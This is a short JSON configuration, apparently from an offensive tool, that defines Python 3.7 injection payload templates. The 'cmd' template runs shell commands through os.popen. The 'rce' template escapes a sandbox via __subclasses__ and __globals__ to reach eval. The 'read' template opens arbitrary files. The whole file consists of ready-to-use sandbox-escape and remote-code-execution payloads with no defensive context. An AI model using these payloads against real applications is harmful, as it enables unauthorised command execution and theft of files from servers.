{
    "name": "py37",
    "payload": {
        "cmd":{
            "number": 1,
            "template": "getattr(__import__('types').__builtins__['__import__']('os'), 'popen')('{{0}}').read()"
        },
        "rce":{
            "number": 1,
            "template": "''.__class__.__mro__[1].__subclasses__()[103].__init__.__globals__['__builtins__']['eval'](\"{{0}}\")"
        },
        "read":{
            "number": 1,
            "template": "().__class__.__bases__[0].__subclasses__()[103].__init__.__globals__['__builtins__']['open']('{{0}}').read()"
        }
    }
}